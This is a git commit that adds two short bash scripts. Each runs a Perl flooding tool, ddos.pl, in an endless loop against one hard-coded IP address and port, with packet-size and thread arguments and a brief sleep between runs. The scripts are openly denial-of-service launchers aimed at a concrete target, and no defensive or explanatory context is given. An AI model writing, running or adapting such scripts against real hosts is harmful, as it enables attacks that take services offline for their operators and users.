7d2c045da6c727bdf878d7c0dcac2810176c8297
BloodySoul1 <46107781+BloodySoul1@users.noreply.github.com>
2024-03-19 09:19:04 +0200

    Add files via upload

---
+++ autoddosscript.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+while true
+do 
+    perl ddos.pl 5.83.164.144 10030 1048 8
+    sleep 3
+done
---
+++ autoddosscript2.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+while true
+do 
+    perl ddos.pl 5.83.164.144 10030 1024 8
+    sleep 4
+done
+
